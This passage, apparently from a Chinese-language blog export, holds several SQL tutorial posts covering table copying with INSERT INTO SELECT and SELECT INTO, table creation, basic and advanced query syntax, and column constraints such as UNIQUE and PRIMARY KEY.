    <content><![CDATA[<p>Insert是T-sql中常用语句，Insert INTO table(field1,field2,…)<br>values(value1,value2,…)这种形式的在应用程序开发中必不可少。但我们在开发、测试过程中，经常会遇到需要表复制的情况，如将一个table1的数据的部分字段复制到table2中，或者将整个table1复制到table2中，这时候我们就要使用[SELECT<br>INTO 和 INSERT INTO SELECT<br>表复制语句了。]{style&#x3D;”font-family: Verdana;”}</p>
<p>1.[INSERT INTO SELECT语句]{style&#x3D;”font-family: Verdana;”}</p>
<p>语句形式为：[[Insert into Table2(field1,field2,…) select<br>value1,value2,… from<br>Table1]{style&#x3D;”font-family: Verdana;”}]{style&#x3D;”font-family: Verdana;”}</p>
<p>[要求目标表Table2必须存在，由于目标表Table2已经存在，所以我们除了插入源表Table1的字段外，还可以插入常量。示例如下：]{style&#x3D;”font-family: Verdana;”}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--1.创建测试表</span><br><span class="line"> create TABLE Table1</span><br><span class="line"> (</span><br><span class="line">     a varchar(10),</span><br><span class="line">     b varchar(10),</span><br><span class="line">     c varchar(10),</span><br><span class="line">     CONSTRAINT [PK_Table1] PRIMARY KEY CLUSTERED</span><br><span class="line">     (</span><br><span class="line">         a ASC</span><br><span class="line">     )</span><br><span class="line"> ) ON [PRIMARY]</span><br><span class="line"></span><br><span class="line">create TABLE Table2</span><br><span class="line"> (</span><br><span class="line">     a varchar(10),</span><br><span class="line">     c varchar(10),</span><br><span class="line">     d int,</span><br><span class="line">     CONSTRAINT [PK_Table2] PRIMARY KEY CLUSTERED</span><br><span class="line">     (</span><br><span class="line">         a ASC</span><br><span class="line">     )</span><br><span class="line"> ) ON [PRIMARY]</span><br><span class="line"> GO</span><br><span class="line"> --2.创建测试数据</span><br><span class="line"> Insert into Table1 values(&#x27;赵&#x27;,&#x27;asds&#x27;,&#x27;90&#x27;)</span><br><span class="line"> Insert into Table1 values(&#x27;钱&#x27;,&#x27;asds&#x27;,&#x27;100&#x27;)</span><br><span class="line"> Insert into Table1 values(&#x27;孙&#x27;,&#x27;asds&#x27;,&#x27;80&#x27;)</span><br><span class="line"> Insert into Table1 values(&#x27;李&#x27;,&#x27;asds&#x27;,null)</span><br><span class="line"> GO</span><br><span class="line"> select * from Table2</span><br><span class="line"></span><br><span class="line">--3.INSERT INTO SELECT语句复制表数据</span><br><span class="line"> Insert into Table2(a, c, d) select a,c,5 from Table1</span><br><span class="line"> GO</span><br><span class="line"></span><br><span class="line">--4.显示更新后的结果</span><br><span class="line"> select * from Table2</span><br><span class="line"> GO</span><br><span class="line"> --5.删除测试表</span><br><span class="line"> drop TABLE Table1</span><br><span class="line"> drop TABLE Table2</span><br></pre></td></tr></table></figure>

<p>2.SELECT INTO FROM语句</p>
<p>语句形式为：SELECT vale1, value2 into Table2 from Table1</p>
<p>要求目标表Table2不存在，因为在插入时会自动创建表Table2，并将Table1中指定字段数据复制到Table2中。示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   --1.创建测试表</span><br><span class="line"> create TABLE Table1</span><br><span class="line"> (</span><br><span class="line">     a varchar(10),</span><br><span class="line">     b varchar(10),</span><br><span class="line">     c varchar(10),</span><br><span class="line">     CONSTRAINT [PK_Table1] PRIMARY KEY CLUSTERED</span><br><span class="line">     (</span><br><span class="line">         a ASC</span><br><span class="line">     )</span><br><span class="line"> ) ON [PRIMARY]</span><br><span class="line"> GO</span><br><span class="line"></span><br><span class="line">--2.创建测试数据</span><br><span class="line"> Insert into Table1 values(&#x27;赵&#x27;,&#x27;asds&#x27;,&#x27;90&#x27;)</span><br><span class="line"> Insert into Table1 values(&#x27;钱&#x27;,&#x27;asds&#x27;,&#x27;100&#x27;)</span><br><span class="line"> Insert into Table1 values(&#x27;孙&#x27;,&#x27;asds&#x27;,&#x27;80&#x27;)</span><br><span class="line"> Insert into Table1 values(&#x27;李&#x27;,&#x27;asds&#x27;,null)</span><br><span class="line"> GO</span><br><span class="line"></span><br><span class="line">--3.SELECT INTO FROM语句创建表Table2并复制数据</span><br><span class="line"> select a,c INTO Table2 from Table1</span><br><span class="line"> GO</span><br><span class="line"></span><br><span class="line">--4.显示更新后的结果</span><br><span class="line"> select * from Table2</span><br><span class="line"> GO</span><br><span class="line"> --5.删除测试表</span><br><span class="line"> drop TABLE Table1</span><br><span class="line"> drop TABLE Table2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL语法数据库和表</title>
    <url>/blog/database/sql/tableanddb/</url>
    <content><![CDATA[<h2 id="数据库相关"><a href="#数据库相关" class="headerlink" title="数据库相关"></a>数据库相关</h2><p>1、说明：创建数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE database-name</span><br></pre></td></tr></table></figure>

<p>2、说明：删除数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop database dbname</span><br></pre></td></tr></table></figure>

<h2 id="表相关"><a href="#表相关" class="headerlink" title="表相关"></a>表相关</h2><h4 id="创建新表"><a href="#创建新表" class="headerlink" title="创建新表"></a>创建新表</h4><p>CREATE TABLE 语句</p>
<p>CREATE TABLE 语句用于创建数据库中的表。</p>
<p>SQL CREATE TABLE 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE 表名称</span><br><span class="line">(</span><br><span class="line">列名称1 数据类型,</span><br><span class="line">列名称2 数据类型,</span><br><span class="line">列名称3 数据类型,</span><br><span class="line">....</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p> </p>
<p>数据类型（data_type）规定了列可容纳何种数据类型。下面的表格包含了SQL中最常用的数据类型：</p>
<p>+———————————–+———————————–+<br>| <strong>数据类型</strong>                      | <strong>描述</strong>                          |<br>+———————————–+———————————–+<br>| integer(size)                     | 仅容纳整数。在括号内规定数字的最大位数。 |<br>|                                   |                                   |<br>| int(size)                         |                                   |<br>|                                   |                                   |<br>| smallint(size)                    |                                   |<br>|                                   |                                   |<br>| tinyint(size)                     |                                   |<br>+———————————–+———————————–+<br>| decimal(size,d)                   | 容纳带有小数的数字。              |<br>|                                   |                                   |<br>| numeric(size,d)                   | “size” 规定数字的最大位数。”d”    |<br>|                                   | 规定小数点右侧的最大位数。        |<br>+———————————–+———————————–+<br>| char(size)                        | 容纳固定长度的字符串（可容纳字母、数字以及特殊字符）。 |<br>|                                   |                                   |<br>|                                   |                                   |<br>|                                   | 在括号中规定字符串的长度。        |<br>+———————————–+———————————–+<br>| varchar(size)                     | 容纳可变长度的字符串（可容纳字母、数字以及特殊的字符）。 |<br>|                                   |                                   |<br>|                                   |                                   |<br>|                                   | 在括号中规定字符串的最大长度。    |<br>+———————————–+———————————–+<br>| date(yyyymmdd)                    | 容纳日期。                        |<br>+———————————–+———————————–+</p>
<h4 id="根据已有的表创建新表"><a href="#根据已有的表创建新表" class="headerlink" title="根据已有的表创建新表"></a>根据已有的表创建新表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table tab_new like tab_old (使用旧表创建新表)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table tab_new as select col1,col2… from tab_old definition only</span><br></pre></td></tr></table></figure>

<h4 id="删除新表"><a href="#删除新表" class="headerlink" title="删除新表"></a>删除新表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table tabname</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL语法基础</title>
    <url>/blog/database/sql/yfbase/</url>
    <content><![CDATA[<h3 id="SQL-DML-和-DDL"><a href="#SQL-DML-和-DDL" class="headerlink" title="SQL DML 和 DDL"></a>SQL DML 和 DDL</h3><p>可以把 SQL 分为两个部分：数据操作语言 (DML) 和 数据定义语言 (DDL)。</p>
<p>SQL (结构化查询语言)是用于执行查询的语法。但是 SQL<br>语言也包含用于更新、插入和删除记录的语法。</p>
<p>查询和更新指令构成了 SQL 的 DML 部分：</p>
<ol>
<li>SELECT – 从数据库表中获取数据</li>
<li>UPDATE – 更新数据库表中的数据</li>
<li>DELETE – 从数据库表中删除数据</li>
<li>INSERT INTO – 向数据库表中插入数据</li>
</ol>
<p>SQL 的数据定义语言 (DDL)<br>部分使我们有能力创建或删除表格。我们也可以定义索引（键），规定表之间的链接，以及施加表间的约束。</p>
<p>SQL 中最重要的 DDL 语句:</p>
<ol>
<li>CREATE DATABASE – 创建新数据库</li>
<li>ALTER DATABASE – 修改数据库</li>
<li>CREATE TABLE – 创建新表</li>
<li>ALTER TABLE – 变更（改变）数据库表</li>
<li>DROP TABLE – 删除表</li>
<li>CREATE INDEX – 创建索引（搜索键）</li>
<li>DROP INDEX – 删除索引</li>
</ol>
<h3 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名称 FROM 表名称</span><br></pre></td></tr></table></figure>

<p>以及：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM 表名称</span><br></pre></td></tr></table></figure>

<h3 id="SELECT-DISTINCT-语句"><a href="#SELECT-DISTINCT-语句" class="headerlink" title="SELECT DISTINCT 语句"></a>SELECT DISTINCT 语句</h3><p>在表中，可能会包含重复值。这并不成问题，不过，有时您也许希望仅仅列出不同（distinct）的值。</p>
<p>关键词 DISTINCT 用于返回唯一不同的值。</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DISTINCT 列名称 FROM 表名称</span><br></pre></td></tr></table></figure>

<h3 id="WHERE-子句"><a href="#WHERE-子句" class="headerlink" title="WHERE 子句"></a>WHERE 子句</h3><p>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名称 FROM 表名称 WHERE 列 运算符 值</span><br></pre></td></tr></table></figure>

<p> </p>
<p>引号的使用</p>
<p>下面的运算符可在 WHERE 子句中使用：</p>
<hr>
<p>  <strong>操作符</strong>   <strong>描述</strong><br>  &#x3D;            等于<br>  &lt;&gt;         不等于<br>  &gt;           大于<br>  &lt;           小于<br>  &gt;&#x3D;          大于等于<br>  &lt;&#x3D;          小于等于<br>  BETWEEN      在某个范围内<br>  LIKE         搜索某种模式</p>
<hr>
<p>请注意，条件值周围使用的是单引号。</p>
<p>SQL<br>使用单引号来环绕文本值（大部分数据库系统也接受双引号）。如果是数值，请不要使用引号。</p>
<h3 id="AND-和-OR-运算符"><a href="#AND-和-OR-运算符" class="headerlink" title="AND 和 OR 运算符"></a>AND 和 OR 运算符</h3><p>AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。</p>
<p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p>
<p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p>
<p>我们也可以把 AND 和 OR 结合起来（使用圆括号来组成复杂的表达式）</p>
<h3 id="ORDER-BY-语句"><a href="#ORDER-BY-语句" class="headerlink" title="ORDER BY 语句"></a>ORDER BY 语句</h3><p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p>
<p>ORDER BY 语句默认按照升序对记录进行排序。</p>
<p>如果您希望按照降序对记录进行排序，可以使用 DESC 关键字。</p>
<h3 id="INSERT-INTO-语句"><a href="#INSERT-INTO-语句" class="headerlink" title="INSERT INTO 语句"></a>INSERT INTO 语句</h3><p>INSERT INTO 语句用于向表格中插入新的行。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br></pre></td></tr></table></figure>

<p>我们也可以指定所要插入数据的列：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br></pre></td></tr></table></figure>

<h3 id="Update-语句"><a href="#Update-语句" class="headerlink" title="Update 语句"></a>Update 语句</h3><p>Update 语句用于修改表中的数据。</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值</span><br></pre></td></tr></table></figure>

<h3 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a>DELETE 语句</h3><p>DELETE 语句用于删除表中的行。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM 表名称 WHERE 列名称 = 值</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 语法高级</title>
    <url>/blog/database/sql/yfgj/</url>
    <content><![CDATA[<h3 id="NULL-值"><a href="#NULL-值" class="headerlink" title="NULL 值"></a>NULL 值</h3><p>NULL 值是遗漏的未知数据。</p>
<p>默认地，表的列可以存放 NULL 值。</p>
<p>如果表中的某个列是可选的，那么我们可以在不向该列添加值的情况下插入新记录或更新已有的记录。这意味着该字段将以<br>NULL 值保存。</p>
<p>NULL 值的处理方式与其他值不同。</p>
<p>NULL 用作未知的或不适用的值的占位符。</p>
<p>注释：无法比较 NULL 和 0；它们是不等价的。</p>
<p>我们要用IS NULL和IS NOT NULL来判断列的值。</p>
<h3 id="NULL-函数"><a href="#NULL-函数" class="headerlink" title="NULL 函数"></a>NULL 函数</h3><p>如果 “UnitsOnOrder” 是 NULL，则不利于计算，因此如果值是 NULL 则返回 0。</p>
<h4 id="SQL-Server-x2F-MS-Access"><a href="#SQL-Server-x2F-MS-Access" class="headerlink" title="SQL Server &#x2F; MS Access"></a>SQL Server &#x2F; MS Access</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ProductName,UnitPrice*(UnitsInStock+ISNULL(UnitsOnOrder,0))</span><br><span class="line">FROM Products</span><br></pre></td></tr></table></figure>

<h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p>Oracle 没有 ISNULL() 函数。不过，我们可以使用 NVL() 函数达到相同的结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ProductName,UnitPrice*(UnitsInStock+NVL(UnitsOnOrder,0))</span><br><span class="line">FROM Products</span><br></pre></td></tr></table></figure>

<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>MySQL 也拥有类似 ISNULL() 的函数。不过它的工作方式与微软的 ISNULL()<br>函数有点不同。</p>
<p>在 MySQL 中，我们可以使用 IFNULL() 函数，就像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ProductName,UnitPrice*(UnitsInStock+IFNULL(UnitsOnOrder,0))</span><br><span class="line">FROM Products</span><br></pre></td></tr></table></figure>

<p>或者我们可以使用 COALESCE() 函数，就像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ProductName,UnitPrice*(UnitsInStock+COALESCE(UnitsOnOrder,0))</span><br><span class="line">FROM Products</span><br></pre></td></tr></table></figure>

<h3 id="TOP-子句"><a href="#TOP-子句" class="headerlink" title="TOP 子句"></a>TOP 子句</h3><p>TOP 子句用于规定要返回的记录的数目。</p>
<p>对于拥有数千条记录的大型表来说，TOP 子句是非常有用的。</p>
<p>注释：并非所有的数据库系统都支持 TOP 子句。</p>
<p>SQL Server 的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT TOP number|percent column_name(s)</span><br><span class="line">FROM table_name</span><br></pre></td></tr></table></figure>

<p>MySQL 和 Oracle 中的 SQL SELECT TOP 是等价的</p>
<p>MySQL 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">LIMIT number</span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM Persons</span><br><span class="line">LIMIT 5</span><br><span class="line">Oracle 语法</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE ROWNUM &lt;= number</span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM Persons</span><br><span class="line">WHERE ROWNUM &lt;= 5</span><br></pre></td></tr></table></figure>

<h3 id="LIKE-操作符"><a href="#LIKE-操作符" class="headerlink" title="LIKE 操作符"></a>LIKE 操作符</h3><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p>
<p>SQL LIKE 操作符语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name LIKE pattern</span><br></pre></td></tr></table></figure>

<p> </p>
<hr>
<p>  <strong>通配符</strong>        <strong>描述</strong></p>
<p>  %                替代一个或多个字符</p>
<p>  _                仅替代一个字符</p>
<p>  [charlist]      字符列中的任何单一字符</p>
<p>  [^charlist]\   不在字符列中的任何单一字符<br>  或者\<br>  [!charlist]     </p>
<hr>
<h3 id="IN-操作符"><a href="#IN-操作符" class="headerlink" title="IN 操作符"></a>IN 操作符</h3><p>IN 操作符允许我们在 WHERE 子句中规定多个值。</p>
<p>SQL IN 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name IN (value1,value2,...)</span><br></pre></td></tr></table></figure>

<h3 id="BETWEEN-操作符"><a href="#BETWEEN-操作符" class="headerlink" title="BETWEEN 操作符"></a>BETWEEN 操作符</h3><p>操作符 BETWEEN … AND<br>会选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。</p>
<p>BETWEEN 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name</span><br><span class="line">BETWEEN value1 AND value2</span><br></pre></td></tr></table></figure>

<h3 id="Alias"><a href="#Alias" class="headerlink" title="Alias"></a>Alias</h3><p>表的 SQL Alias 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name</span><br><span class="line">AS alias_name</span><br></pre></td></tr></table></figure>

<p>列的 SQL Alias 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name AS alias_name</span><br><span class="line">FROM table_name</span><br></pre></td></tr></table></figure>

<p>Alias 实例: 使用表名称别名</p>
<p>假设我们有两个表分别是：”Persons” 和<br>“Product_Orders”。我们分别为它们指定别名 “p” 和 “po”。</p>
<p>现在，我们希望列出 “John Adams” 的所有定单。</p>
<p>我们可以使用下面的 SELECT 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT po.OrderID, p.LastName, p.FirstName</span><br><span class="line">FROM Persons AS p, Product_Orders AS po</span><br><span class="line">WHERE p.LastName=&#x27;Adams&#x27; AND p.FirstName=&#x27;John&#x27;</span><br></pre></td></tr></table></figure>

<p>不使用别名的 SELECT 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT Product_Orders.OrderID, Persons.LastName, Persons.FirstName</span><br><span class="line">FROM Persons, Product_Orders</span><br><span class="line">WHERE Persons.LastName=&#x27;Adams&#x27; AND Persons.FirstName=&#x27;John&#x27;</span><br></pre></td></tr></table></figure>

<p>从上面两条 SELECT 语句您可以看到，别名使查询程序更易阅读和书写。</p>
<h3 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h3><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
<p>请注意，UNION 内部的 SELECT<br>语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT<br>语句中的列的顺序必须相同。</p>
<p>SQL UNION 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>

<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION<br>ALL。</p>
<p>SQL UNION ALL 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>

<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
<h3 id="GROUP-BY-语句"><a href="#GROUP-BY-语句" class="headerlink" title="GROUP BY 语句"></a>GROUP BY 语句</h3><p>GROUP BY 语句用于结合合计函数，根据一个或多个列对结果集进行分组。</p>
<p>SQL GROUP BY 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name, aggregate_function(column_name)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name operator value</span><br><span class="line">GROUP BY column_name</span><br></pre></td></tr></table></figure>

<h3 id="HAVING-子句"><a href="#HAVING-子句" class="headerlink" title="HAVING 子句"></a>HAVING 子句</h3><p>在 SQL 中增加 HAVING 子句原因是，WHERE 关键字无法与合计函数一起使用。</p>
<p>SQL HAVING 语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name, aggregate_function(column_name)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name operator value</span><br><span class="line">GROUP BY column_name</span><br><span class="line">HAVING aggregate_function(column_name) operator value</span><br></pre></td></tr></table></figure>

<h3 id="SELECT-INTO-语句"><a href="#SELECT-INTO-语句" class="headerlink" title="SELECT INTO 语句"></a>SELECT INTO 语句</h3><p>SELECT INTO 语句从一个表中选取数据，然后把数据插入另一个表中。</p>
<p>SELECT INTO 语句常用于创建表的备份复件或者用于对记录进行存档。</p>
<p>SQL SELECT INTO 语法</p>
<p>您可以把所有的列插入新表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">INTO new_table_name [IN externaldatabase] </span><br><span class="line">FROM old_tablename</span><br></pre></td></tr></table></figure>

<p>或者只把希望的列插入新表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">INTO new_table_name [IN externaldatabase] </span><br><span class="line">FROM old_tablename</span><br></pre></td></tr></table></figure>

<p> </p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 约束详解</title>
    <url>/blog/database/sql/ysxj/</url>
    <content><![CDATA[<p>约束用于限制加入表的数据的类型。</p>
<p>可以在创建表时规定约束（通过 CREATE TABLE<br>语句），或者在表创建之后也可以（通过 ALTER TABLE 语句）。</p>
<p>我们将主要探讨以下几种约束：</p>
<ol>
<li>NOT NULL</li>
<li>UNIQUE</li>
<li>PRIMARY KEY</li>
<li>FOREIGN KEY</li>
<li>CHECK</li>
<li>DEFAULT</li>
</ol>
<p>注释：在下面的章节，我们会详细讲解每一种约束。</p>
<h3 id="NOT-NULL-约束"><a href="#NOT-NULL-约束" class="headerlink" title="NOT NULL 约束"></a>NOT NULL 约束</h3><p>NOT NULL 约束强制列不接受 NULL 值。</p>
<p>NOT NULL<br>约束强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。</p>
<p>下面的 SQL 语句强制 “Id_P” 列和 “LastName” 列不接受 NULL 值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="UNIQUE-约束"><a href="#UNIQUE-约束" class="headerlink" title="UNIQUE 约束"></a>UNIQUE 约束</h3><p>UNIQUE 约束唯一标识数据库表中的每条记录。</p>
<p>UNIQUE 和 PRIMARY KEY 约束均为列或列集合提供了唯一性的保证。</p>
<p>PRIMARY KEY 拥有自动定义的 UNIQUE 约束。</p>
<p>请注意，每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY<br>约束。</p>
<h4 id="CREATE-TABLE中的UNIQUE"><a href="#CREATE-TABLE中的UNIQUE" class="headerlink" title="CREATE TABLE中的UNIQUE"></a>CREATE TABLE中的UNIQUE</h4><p>下面的 SQL 在 “Persons” 表创建时在 “Id_P” 列创建 UNIQUE 约束：</p>
<p>MySQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">UNIQUE (Id_P)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL UNIQUE,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如果需要命名 UNIQUE 约束，以及为多个列定义 UNIQUE 约束，请使用下面的 SQL<br>语法：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT uc_PersonID UNIQUE (Id_P,LastName)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="ALTER-TABLE中的UNIQUE"><a href="#ALTER-TABLE中的UNIQUE" class="headerlink" title="ALTER TABLE中的UNIQUE"></a>ALTER TABLE中的UNIQUE</h4><p>当表已被创建时，如需在 “Id_P” 列创建 UNIQUE 约束，请使用下列 SQL：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD UNIQUE (Id_P)</span><br></pre></td></tr></table></figure>

<p>如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，请使用下面的 SQL<br>语法：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD CONSTRAINT uc_PersonID UNIQUE (Id_P,LastName)</span><br></pre></td></tr></table></figure>

<h4 id="撤销-UNIQUE-约束"><a href="#撤销-UNIQUE-约束" class="headerlink" title="撤销 UNIQUE 约束"></a>撤销 UNIQUE 约束</h4><p>如需撤销 UNIQUE 约束，请使用下面的 SQL：</p>
<p>MySQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP INDEX uc_PersonID</span><br></pre></td></tr></table></figure>

<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP CONSTRAINT uc_PersonID</span><br></pre></td></tr></table></figure>

<h3 id="PRIMARY-KEY-约束"><a href="#PRIMARY-KEY-约束" class="headerlink" title="PRIMARY KEY 约束"></a>PRIMARY KEY 约束</h3><p>PRIMARY KEY 约束唯一标识数据库表中的每条记录。</p>
<p>主键必须包含唯一的值。</p>
<p>主键列不能包含 NULL 值。</p>
<p>每个表都应该有一个主键，并且每个表只能有一个主键。</p>
<h4 id="CREATE-TABLE中的PRIMARY-KEY"><a href="#CREATE-TABLE中的PRIMARY-KEY" class="headerlink" title="CREATE TABLE中的PRIMARY KEY"></a>CREATE TABLE中的PRIMARY KEY</h4><p>下面的 SQL 在 “Persons” 表创建时在 “Id_P” 列创建 PRIMARY KEY 约束：</p>
<p>MySQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">PRIMARY KEY (Id_P)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
